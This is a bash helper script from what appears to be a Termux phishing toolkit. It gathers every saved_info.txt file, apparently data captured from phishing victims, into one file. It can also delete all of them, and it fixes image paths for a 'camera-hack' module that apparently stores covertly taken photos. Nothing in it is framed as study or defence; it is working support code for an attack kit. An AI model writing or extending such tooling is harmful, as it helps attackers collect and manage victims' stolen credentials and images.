#!bin/bash
cd /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools
if [[ -a saved_info.txt ]];then
	rm saved_info.txt
fi

if [[ $1 == del ]];then
	while :
	do
		control=$(tree -i -f |grep -o saved_info.txt |sed -n 1p |wc -l)
		_command_location_file=$(tree -i -f |grep saved_info.txt)
		if [[ $control == 1 ]];then
			rm $_command_location_file
		else
			exit
		fi
	done
fi

control=$(tree -i -f |grep saved_info.txt |wc -l)
if [[ $control == 0 ]];then
	exit
fi

tree -i -f |grep saved_info.txt > all
total=$(cat all |wc -l)

for no in `seq 1 $total`;do
	file=$(cat all |sed -n $no\p)
	control=$(cat $file |grep -o images |sed -n 1p | wc -l)
	cat $file >> saved_info.txt
	if [[ $control == 1 ]];then
		sed -ie 's/images/camera-hack\/photoshop\/images/g' saved_info.txt
		rm saved_info.txte
	fi
done
rm all
